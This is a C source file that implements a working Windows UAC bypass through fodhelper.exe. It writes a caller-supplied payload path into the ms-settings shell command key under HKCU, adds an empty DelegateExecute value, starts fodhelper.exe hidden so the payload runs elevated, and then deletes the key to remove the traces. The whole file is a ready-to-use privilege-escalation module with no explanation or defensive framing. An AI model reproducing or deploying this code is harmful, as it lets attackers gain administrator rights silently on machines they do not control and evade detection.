#include <windows.h>
#include <stdio.h>

#include "utils.h"

#define UAC_BYPASS_REG_PATH "Software\\Classes\\ms-settings\\shell\\open\\command"

void set_registry(const char* payload) {
    HKEY hKey;
    LONG status;

    // Create or open the registry key
    status = RegCreateKeyEx(HKEY_CURRENT_USER, UAC_BYPASS_REG_PATH, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (status != ERROR_SUCCESS) {
        printf("Failed to create/open registry key. Error: %ld\n", status);
        return;
    }

    // Set the default value to the payload path
    status = RegSetValueEx(hKey, NULL, 0, REG_SZ, (const BYTE*)payload, (DWORD)(strlen(payload) + 1));
    if (status != ERROR_SUCCESS) {
        printf("Failed to set default value. Error: %ld\n", status);
        RegCloseKey(hKey);
        return;
    }

    // Add the "DelegateExecute" value (empty)
    status = RegSetValueEx(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
    if (status != ERROR_SUCCESS) {
        printf("Failed to set DelegateExecute value. Error: %ld\n", status);
        RegCloseKey(hKey);
        return;
    }

    RegCloseKey(hKey);
    printf("Registry key set successfully.\n");
}

int execute_fodhelper() {
    SHELLEXECUTEINFO sei = {0};
    sei.cbSize = sizeof(SHELLEXECUTEINFO);
    sei.lpVerb = "open";
    sei.lpFile = "fodhelper.exe";
    sei.nShow = SW_HIDE;  // Run hidden
    sei.fMask = SEE_MASK_NOASYNC;

    if (!ShellExecuteEx(&sei)) {
        printf("Failed to execute fodhelper.exe. Error: %ld\n", GetLastError());
        return 1;
    } else {
        printf("fodhelper.exe executed successfully.\n");
        return 0;
    }
}

void clean_registry() {
    Sleep(1000); // Wait for fodhelper.exe to finish
    LONG status = RegDeleteKey(HKEY_CURRENT_USER, UAC_BYPASS_REG_PATH);
    if (status != ERROR_SUCCESS) {
        printf("Failed to clean up registry key. Error: %ld\n", status);
    } else {
        printf("Registry key cleaned up successfully.\n");
    }
}

int BypassUAC(char* payload){
    printf("Setting registry...\n");
    set_registry(payload);

    printf("Executing fodhelper.exe...\n");
    if(execute_fodhelper()) return 0;

    printf("Cleaning up registry...\n");
    clean_registry();

    return 1;
}